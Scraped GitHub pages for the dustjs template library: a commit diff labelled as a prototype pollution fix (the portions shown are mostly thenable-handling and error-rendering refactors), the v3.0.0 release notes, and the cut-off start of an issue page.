=== Content from github.com_074d8c7d_20250114_192335.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flinkedin%2Fdustjs%2Fcommit%2Fddb6523832465d38c9d80189e9de60519ac307c3)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flinkedin%2Fdustjs%2Fcommit%2Fddb6523832465d38c9d80189e9de60519ac307c3)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=linkedin%2Fdustjs)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[linkedin](/linkedin)
/
**[dustjs](/linkedin/dustjs)**
Public

* [Notifications](/login?return_to=%2Flinkedin%2Fdustjs) You must be signed in to change notification settings
* [Fork
  479](/login?return_to=%2Flinkedin%2Fdustjs)
* [Star
   2.9k](/login?return_to=%2Flinkedin%2Fdustjs)

* [Code](/linkedin/dustjs)
* [Issues
  77](/linkedin/dustjs/issues)
* [Pull requests
  6](/linkedin/dustjs/pulls)
* [Actions](/linkedin/dustjs/actions)
* [Projects
  0](/linkedin/dustjs/projects)
* [Wiki](/linkedin/dustjs/wiki)
* [Security](/linkedin/dustjs/security)
* [Insights](/linkedin/dustjs/pulse)

Additional navigation options

* [Code](/linkedin/dustjs)
* [Issues](/linkedin/dustjs/issues)
* [Pull requests](/linkedin/dustjs/pulls)
* [Actions](/linkedin/dustjs/actions)
* [Projects](/linkedin/dustjs/projects)
* [Wiki](/linkedin/dustjs/wiki)
* [Security](/linkedin/dustjs/security)
* [Insights](/linkedin/dustjs/pulse)

## Commit

[Permalink](/linkedin/dustjs/commit/ddb6523832465d38c9d80189e9de60519ac307c3)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

fix for prototype pollution vulnerability

[Browse files](/linkedin/dustjs/tree/ddb6523832465d38c9d80189e9de60519ac307c3)
Browse the repository at this point in the history

* Loading branch information

[![@sumeetkakkar](https://avatars.githubusercontent.com/u/12142941?s=40&v=4)](/sumeetkakkar)

[sumeetkakkar](/linkedin/dustjs/commits?author=sumeetkakkar "View all commits by sumeetkakkar")
committed
Oct 12, 2021

1 parent
[e0e25f7](/linkedin/dustjs/commit/e0e25f7c1bc5905090e8160c28b8e83ab7f34e20)

commit ddb6523

 Show file tree

 Hide file tree

Showing
**9 changed files**
with
**907 additions**
and
**741 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* .gitignore
  [.gitignore](#diff-bc37d034bad564583790a46f19d807abfe519c5671395fd494d8cce506c42947)
* .travis.yml
  [.travis.yml](#diff-6ac3f79fc25d95cd1e3d51da53a4b21b939437392578a35ae8cd6d5366ca5485)
* dist

  + dist/dust-core.js
    [dust-core.js](#diff-499cf69cd397a874a93399f5d6b3bd95bfc373b7e20abb8cb524d4579365cf51)
  + dist/dust-core.min.js
    [dust-core.min.js](#diff-0f58aa4220429f4109857ec9f27ab97e6b5b6ed83b5b2c8c401ebc983f42e431)
  + dist/dust-full.js
    [dust-full.js](#diff-8a533926aefac43e16021b1292b904287c53e5e521527b729d099bc7bb225866)
  + dist/dust-full.min.js
    [dust-full.min.js](#diff-c35a7279495c246196b7a7b3c0274c584393deec160e464c71d5e5e9d970fb4d)
* lib

  + lib/compiler.js
    [compiler.js](#diff-544803892ac752aa674ffa81380c022af562eda776860d94eb5c2d3bdb59c99c)
* package.json
  [package.json](#diff-7ae45ad102eab3b6d7e7896acd08c427a9b25b346470d7bc6507b6481575d519)
* test

  + test/core.spec.js
    [core.spec.js](#diff-8b70001a30f15b76217a7045cea8065dd7e35444e433eebd84f72b20ec7fbe57)

## There are no files selected for viewing

2 changes: 2 additions & 0 deletions

2
[.gitignore](#diff-bc37d034bad564583790a46f19d807abfe519c5671395fd494d8cce506c42947 ".gitignore")

Show comments

[View file](/linkedin/dustjs/blob/ddb6523832465d38c9d80189e9de60519ac307c3/.gitignore)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -6,3 +6,5 @@ tmp |
|  |  | examples/\*/views/\*\*/\*.js |
|  |  | examples/\*/lib/\* |
|  |  | !examples/\*/lib/main.js |
|  |  | .vscode |
|  |  | package-lock.json |

10 changes: 5 additions & 5 deletions

10
[.travis.yml](#diff-6ac3f79fc25d95cd1e3d51da53a4b21b939437392578a35ae8cd6d5366ca5485 ".travis.yml")

Show comments

[View file](/linkedin/dustjs/blob/ddb6523832465d38c9d80189e9de60519ac307c3/.travis.yml)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,11 +1,11 @@ |
|  |  | language: node\_js |
|  |  | node\_js: |
|  |  | - "0.12" |
|  |  | - "5" |
|  |  | - "6" |
|  |  | - "12" |
|  |  | - "14" |
|  |  | - "16" |
|  |  | matrix: |
|  |  | include: |
|  |  | - node\_js: "0.10" |
|  |  | - node\_js: "12" |
|  |  | env: |
|  |  | - TEST="all" |
|  |  | - CXX=g++-4.8 |
| Expand All | | @@ -14,7 +14,7 @@ notifications: |
|  |  | - jchan@linkedin.com |
|  |  | - skinast@linkedin.com |
|  |  | before\_install: |
|  |  | - npm install -g npm@3 |
|  |  | - npm install -g npm@6 |
|  |  | before\_script: |
|  |  | - npm update |
|  |  | sudo: false |
| Expand Down | |  |

136 changes: 99 additions & 37 deletions

136
[dist/dust-core.js](#diff-499cf69cd397a874a93399f5d6b3bd95bfc373b7e20abb8cb524d4579365cf51 "dist/dust-core.js")

Show comments

[View file](/linkedin/dustjs/blob/ddb6523832465d38c9d80189e9de60519ac307c3/dist/dust-core.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,6 +1,6 @@ |
|  |  | /\*! dustjs-linkedin - v2.7.2 |
|  |  | \* http://dustjs.com/ |
|  |  | \* Copyright (c) 2015 Aleksander Williams; Released under the MIT License \*/ |
|  |  | \* Copyright (c) 2021 Aleksander Williams; Released under the MIT License \*/ |
|  |  | (function (root, factory) { |
|  |  | if (typeof define === 'function' && define.amd && define.amd.dust === true) { |
|  |  | define('dust.core', [], factory); |
| Expand Down  Expand Up | | @@ -70,6 +70,9 @@ |
|  |  | type = type || INFO; |
|  |  | if (loggingLevels[type] >= loggingLevels[dust.debugLevel]) { |
|  |  | log('[DUST:' + type + ']', message); |
|  |  | if (type === ERROR && dust.debugLevel === DEBUG && message instanceof Error && message.stack) { |
|  |  | log('[DUST:' + type + ']', message.stack); |
|  |  | } |
|  |  | } |
|  |  | }; |
|  |  |  |
| Expand Down  Expand Up | | @@ -248,16 +251,25 @@ |
|  |  | }; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Decide somewhat-naively if something is a Thenable. |
|  |  | \* Decide somewhat-naively if something is a Thenable. Matches Promises A+ Spec, section 1.2 ‚Äúthenable‚Äù is an object or function that defines a then method." |
|  |  | \* @param elem {\*} object to inspect |
|  |  | \* @return {Boolean} is `elem` a Thenable? |
|  |  | \*/ |
|  |  | dust.isThenable = function(elem) { |
|  |  | return elem && |
|  |  | typeof elem === 'object' && |
|  |  | return elem && /\* Beware: `typeof null` is `object` \*/ |
|  |  | (typeof elem === 'object' || typeof elem === 'function') && |
|  |  | typeof elem.then === 'function'; |
|  |  | }; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Decide if an element is a function but not Thenable; it is prefereable to resolve a thenable function by its `.then` method. |
|  |  | \* @param elem {\*} target of inspection |
|  |  | \* @return {Boolean} is `elem` a function without a `.then` property? |
|  |  | \*/ |
|  |  | dust.isNonThenableFunction = function(elem) { |
|  |  | return typeof elem === 'function' && !dust.isThenable(elem); |
|  |  | }; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Decide very naively if something is a Stream. |
|  |  | \* @param elem {\*} object to inspect |
| Expand Down  Expand Up | | @@ -319,12 +331,17 @@ |
|  |  | this.options = options; |
|  |  | this.blocks = blocks; |
|  |  | this.templateName = templateName; |
|  |  | this.\_isContext = true; |
|  |  | } |
|  |  |  |
|  |  | dust.makeBase = dust.context = function(global, options) { |
|  |  | return new Context(undefined, global, options); |
|  |  | }; |
|  |  |  |
|  |  | dust.isContext = function(obj) { |
|  |  | return typeof obj === "object" && obj.\_isContext === true; |
|  |  | }; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Factory function that creates a closure scope around a Thenable-callback. |
|  |  | \* Returns a function that can be passed to a Thenable that will resume a |
| Expand All | | @@ -338,7 +355,8 @@ |
|  |  | } |
|  |  |  |
|  |  | Context.wrap = function(context, name) { |
|  |  | if (context instanceof Context) { |
|  |  | if (dust.isContext(context)) { |
|  |  | context.templateName = name; |
|  |  | return context; |
|  |  | } |
|  |  | return new Context(context, {}, {}, null, name); |
| Expand Down  Expand Up | | @@ -429,7 +447,7 @@ |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | if (typeof ctx === 'function') { |
|  |  | if (dust.isNonThenableFunction(ctx)) { |
|  |  | fn = function() { |
|  |  | try { |
|  |  | return ctx.apply(ctxThis, arguments); |
| Expand Down  Expand Up | | @@ -710,6 +728,11 @@ |
|  |  | return this; |
|  |  | }; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Inserts a new chunk that can be used to asynchronously render or write to it |
|  |  | \* @param callback {Function} The function that will be called with the new chunk |
|  |  | \* @returns {Chunk} A copy of this chunk instance in order to further chain function calls on the chunk |
|  |  | \*/ |
|  |  | Chunk.prototype.map = function(callback) { |
|  |  | var cursor = new Chunk(this.root, this.next, this.taps), |
|  |  | branch = new Chunk(this.root, cursor, this.taps); |
| Expand All | | @@ -725,6 +748,35 @@ |
|  |  | return cursor; |
|  |  | }; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Like Chunk#map but additionally resolves a thenable. If the thenable succeeds the callback is invoked with |
|  |  | \* a new chunk that can be used to asynchronously render or write to it, otherwise if the thenable is rejected |
|  |  | \* then the error body is rendered if available, an error is logged, and the callback is never invoked. |
|  |  | \* @param {Chunk} The current chunk to insert a new chunk |
|  |  | \* @param thenable {Thenable} the target thenable to await |
|  |  | \* @param context {Context} context to use to render the deferred chunk |
|  |  | \* @param bodies {Object} may optionally contain an "error" for when the thenable is rejected |
|  |  | \* @param callback {Function} The function that will be called with the new chunk |
|  |  | \* @returns {Chunk} A copy of this chunk instance in order to further chain function calls on the chunk |
|  |  | \*/ |
|  |  | function mapThenable(chunk, thenable, context, bodies, callback) { |
|  |  | return chunk.map(function(asyncChunk) { |
|  |  | thenable.then(function(data) { |
|  |  | try { |
|  |  | callback(asyncChunk, data); |
|  |  | } catch (err) { |
|  |  | // handle errors the same way Chunk#map would. This logic is only here since the thenable defers |
|  |  | // logic such that the try / catch in Chunk#map would not capture it. |
|  |  | dust.log(err, ERROR); |
|  |  | asyncChunk.setError(err); |
|  |  | } |
|  |  | }, function(err) { |
|  |  | dust.log('Unhandled promise rejection in `' + context.getTemplateName() + '`', INFO); |
|  |  | asyncChunk.renderError(err, context, bodies).end(); |
|  |  | }); |
|  |  | }); |
|  |  | } |
|  |  |  |
|  |  | Chunk.prototype.tap = function(tap) { |
|  |  | var taps = this.taps; |
|  |  |  |
| Expand All | | @@ -746,7 +798,7 @@ |
|  |  | }; |
|  |  |  |
|  |  | Chunk.prototype.reference = function(elem, context, auto, filters) { |
|  |  | if (typeof elem === 'function') { |
|  |  | if (dust.isNonThenableFunction(elem)) { |
|  |  | elem = elem.apply(context.current(), [this, context, null, {auto: auto, filters: filters}]); |
|  |  | if (elem instanceof Chunk) { |
|  |  | return elem; |
| Expand All | | @@ -771,7 +823,7 @@ |
|  |  | chunk = this, |
|  |  | i, len, head; |
|  |  |  |
|  |  | if (typeof elem === 'function' && !dust.isTemplateFn(elem)) { |
|  |  | if (dust.isNonThenableFunction(elem) && !dust.isTemplateFn(elem)) { |
|  |  | try { |
|  |  | elem = elem.apply(context.current(), [this, context, bodies, params]); |
|  |  | } catch(err) { |
| Expand Down  Expand Up | | @@ -846,6 +898,12 @@ |
|  |  | var body = bodies.block, |
|  |  | skip = bodies['else']; |
|  |  |  |
|  |  | if (dust.isThenable(elem)) { |
|  |  | return mapThenable(this, elem, context, bodies, function(chunk, data) { |
|  |  | chunk.exists(data, context, bodies).end(); |
|  |  | }); |
|  |  | } |
|  |  |  |
|  |  | if (!dust.isEmpty(elem)) { |
|  |  | if (body) { |
|  |  | return body(this, context); |
| Expand All | | @@ -861,6 +919,12 @@ |
|  |  | var body = bodies.block, |
|  |  | skip = bodies['else']; |
|  |  |  |
|  |  | if (dust.isThenable(elem)) { |
|  |  | return mapThenable(this, elem, context, bodies, function(chunk, data) { |
|  |  | chunk.notexists(data, context, bodies).end(); |
|  |  | }); |
|  |  | } |
|  |  |  |
|  |  | if (dust.isEmpty(elem)) { |
|  |  | if (body) { |
|  |  | return body(this, context); |
| Expand Down  Expand Up | | @@ -901,11 +965,9 @@ |
|  |  | // The eventual result of evaluating `elem` is a partial name |
|  |  | // Load the partial after getting its name and end the async chunk |
|  |  | return this.capture(elem, context, function(name, chunk) { |
|  |  | partialContext.templateName = name; |
|  |  | load(name, chunk, partialContext).end(); |
|  |  | }); |
|  |  | } else { |
|  |  | partialContext.templateName = elem; |
|  |  | return load(elem, this, partialContext); |
|  |  | } |
|  |  | }; |
| Expand Down  Expand Up | | @@ -957,27 +1019,31 @@ |
|  |  | \* @return {Chunk} |
|  |  | \*/ |
|  |  | Chunk.prototype.await = function(thenable, context, bodies, auto, filters) { |
|  |  | return this.map(function(chunk) { |
|  |  | thenable.then(function(data) { |
|  |  | if (bodies) { |
|  |  | chunk = chunk.section(data, context, bodies); |
|  |  | } else { |
|  |  | // Actually a reference. Self-closing sections don't render |
|  |  | chunk = chunk.reference(data, context, auto, filters); |
|  |  | } |
|  |  | chunk.end(); |
|  |  | }, function(err) { |
|  |  | var errorBody = bodies && bodies.error; |
|  |  | if(errorBody) { |
|  |  | chunk.render(errorBody, context.push(err)).end(); |
|  |  | } else { |
|  |  | dust.log('Unhandled promise rejection in `' + context.getTemplateName() + '`', INFO); |
|  |  | chunk.end(); |
|  |  | } |
|  |  | }); |
|  |  | return mapThenable(this, thenable, context, bodies, function(chunk, data) { |
|  |  | if (bodies) { |
|  |  | chunk.section(data, context, bodies).end(); |
|  |  | } else { |
|  |  | // Actually a reference. Self-closing sections don't render |
|  |  | chunk.reference(data, context, auto, filters).end(); |
|  |  | } |
|  |  | }); |
|  |  | }; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Render an error body if available |
|  |  | \* @param err {Error} error that occurred |
|  |  | \* @param context {Context} context to use to render the error |
|  |  | \* @param bodies {Object} may optionally contain an "error" which will be rendered |
|  |  | \* @return {Chunk} |
|  |  | \*/ |
|  |  | Chunk.prototype.renderError = function(err, context, bodies) { |
|  |  | var errorBody = bodies && bodies.error; |
|  |  | if (errorBody) { |
|  |  | return this.render(errorBody, context.push(err)); |
|  |  | } |
|  |  | return this; |
|  |  | }; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Reserve a chunk to be evaluated with the contents of a streamable. |
|  |  | \* Currently an error event will bomb out the stream. Once an error |
| Expand All | | @@ -989,8 +1055,7 @@ |
|  |  | \* @return {Chunk} |
|  |  | \*/ |
|  |  | Chunk.prototype.stream = function(stream, context, bodies, auto, filters) { |
|  |  | var body = bodies && bodies.block, |
|  |  | errorBody = bodies && bodies.error; |
|  |  | var body = bodies && bodies.block; |
|  |  | return this.map(function(chunk) { |
|  |  | var ended = false; |
|  |  | stream |
| Expand All | | @@ -1012,11 +1077,8 @@ |
|  |  | if(ended) { |
|  |  | return; |
|  |  | } |
|  |  | if(errorBody) { |
|  |  | chunk.render(errorBody, context.push(err)); |
|  |  | } else { |
|  |  | dust.log('Unhandled stream error in `' + context.getTemplateName() + '`', INFO); |
|  |  | } |
|  |  | chunk.renderError(err, context, bodies); |
|  |  | dust.log('Unhandled stream error in `' + context.getTemplateName() + '`', INFO); |
|  |  | if(!ended) { |
|  |  | ended = true; |
|  |  | chunk.end(); |
| Expand Down  Expand Up | | @@ -1143,8 +1205,8 @@ |
|  |  | if (typeof define === "function" && define.amd && define.amd.dust === true) { |
|  |  | define(["require", "dust.core"], function(require, dust) { |
|  |  | dust.onLoad = function(name, cb) { |
|  |  | require([name], function() { |
|  |  | cb(); |
|  |  | require([name], function(tmpl) { |
|  |  | cb(null, tmpl); |
|  |  | }); |
|  |  | }; |
|  |  | return dust; |
| Expand Down | |  |

 Loading

Oops, something went wrong.
 Retry

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `ddb6523`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flinkedin%2Fdustjs%2Fcommit%2Fddb6523832465d38c9d80189e9de60519ac307c3) to comment.

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from github.com_de036832_20250114_192341.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flinkedin%2Fdustjs%2Freleases%2Ftag%2Fv3.0.0)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flinkedin%2Fdustjs%2Freleases%2Ftag%2Fv3.0.0)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Freleases%2Fshow&source=header-repo&source_repo=linkedin%2Fdustjs)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[linkedin](/linkedin)
/
**[dustjs](/linkedin/dustjs)**
Public

* [Notifications](/login?return_to=%2Flinkedin%2Fdustjs) You must be signed in to change notification settings
* [Fork
  479](/login?return_to=%2Flinkedin%2Fdustjs)
* [Star
   2.9k](/login?return_to=%2Flinkedin%2Fdustjs)

* [Code](/linkedin/dustjs/tree/v3.0.0)
* [Issues
  77](/linkedin/dustjs/issues)
* [Pull requests
  6](/linkedin/dustjs/pulls)
* [Actions](/linkedin/dustjs/actions)
* [Projects
  0](/linkedin/dustjs/projects)
* [Wiki](/linkedin/dustjs/wiki)
* [Security](/linkedin/dustjs/security)
* [Insights](/linkedin/dustjs/pulse)

Additional navigation options

* [Code](/linkedin/dustjs/tree/v3.0.0)
* [Issues](/linkedin/dustjs/issues)
* [Pull requests](/linkedin/dustjs/pulls)
* [Actions](/linkedin/dustjs/actions)
* [Projects](/linkedin/dustjs/projects)
* [Wiki](/linkedin/dustjs/wiki)
* [Security](/linkedin/dustjs/security)
* [Insights](/linkedin/dustjs/pulse)

1. [Releases](/linkedin/dustjs/releases)
2. [v3.0.0](/linkedin/dustjs/releases/tag/v3.0.0)

# v3.0.0

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/linkedin/dustjs/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...v3.0.0)

 Loading

[View all tags](/linkedin/dustjs/tags)

![@sumeetkakkar](https://avatars.githubusercontent.com/u/12142941?s=40&v=4)
[sumeetkakkar](/sumeetkakkar)
released this
20 Oct 23:08

¬∑
[9 commits](/linkedin/dustjs/compare/v3.0.0...master)
to master
since this release

[v3.0.0](/linkedin/dustjs/tree/v3.0.0)

[`2e8795c`](/linkedin/dustjs/commit/2e8795c1e6771e63113f17638fac5952d3625e4b)

## What's Changed

* Bump deps by [@sethkinast](https://github.com/sethkinast) in [#734](https://github.com/linkedin/dustjs/pull/734)
* Prioritize resolution of .then by [@brianmhunt](https://github.com/brianmhunt) in [#736](https://github.com/linkedin/dustjs/pull/736)
* Don't use instanceof to determine if a Context is a Context by [@sethkinast](https://github.com/sethkinast) in [#744](https://github.com/linkedin/dustjs/pull/744)
* place location provided by peg 0.9 onto the AST by [@jimmyhchan](https://github.com/jimmyhchan) in [#706](https://github.com/linkedin/dustjs/pull/706)
* {?exists} and {^exists} now supports values from a promise by [@samuelms1](https://github.com/samuelms1) in [#753](https://github.com/linkedin/dustjs/pull/753)
* Decrease security vulnerabilities by upgrading cli dependency ([#754](https://github.com/linkedin/dustjs/issues/754) [#748](https://github.com/linkedin/dustjs/issues/748)) by [@danactive](https://github.com/danactive) in [#756](https://github.com/linkedin/dustjs/pull/756)
* fix: Security bug about prototype pollution by [@sumeetkakkar](https://github.com/sumeetkakkar) in [#805](https://github.com/linkedin/dustjs/pull/805)

## New Contributors

* [@brianmhunt](https://github.com/brianmhunt) made their first contribution in [#736](https://github.com/linkedin/dustjs/pull/736)
* [@samuelms1](https://github.com/samuelms1) made their first contribution in [#753](https://github.com/linkedin/dustjs/pull/753)
* [@danactive](https://github.com/danactive) made their first contribution in [#756](https://github.com/linkedin/dustjs/pull/756)
* [@sumeetkakkar](https://github.com/sumeetkakkar) made their first contribution in [#805](https://github.com/linkedin/dustjs/pull/805)

**Full Changelog**: [v2.7.2...v3.0.0](https://github.com/linkedin/dustjs/compare/v2.7.2...v3.0.0)

### Contributors

* [![@brianmhunt](https://avatars.githubusercontent.com/u/135528?s=64&v=4)](https://github.com/brianmhunt)
* [![@jimmyhchan](https://avatars.githubusercontent.com/u/718471?s=64&v=4)](https://github.com/jimmyhchan)
* [![@danactive](https://avatars.githubusercontent.com/u/1093286?s=64&v=4)](https://github.com/danactive)
* [![@sethkinast](https://avatars.githubusercontent.com/u/1399532?s=64&v=4)](https://github.com/sethkinast)
* [![@samuelms1](https://avatars.githubusercontent.com/u/8550267?s=64&v=4)](https://github.com/samuelms1)
* [![@sumeetkakkar](https://avatars.githubusercontent.com/u/12142941?s=64&v=4)](https://github.com/sumeetkakkar)

brianmhunt, jimmyhchan, and 4 other contributors

 Assets
2

 Loading

 üëç
1
 Syno0 reacted with thumbs up emoji

All reactions

* üëç
  1 reaction

 1 person reacted

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from github.com_4656d2bf_20250114_192336.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flinkedin%2Fdustjs%2Fissues%2F804)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
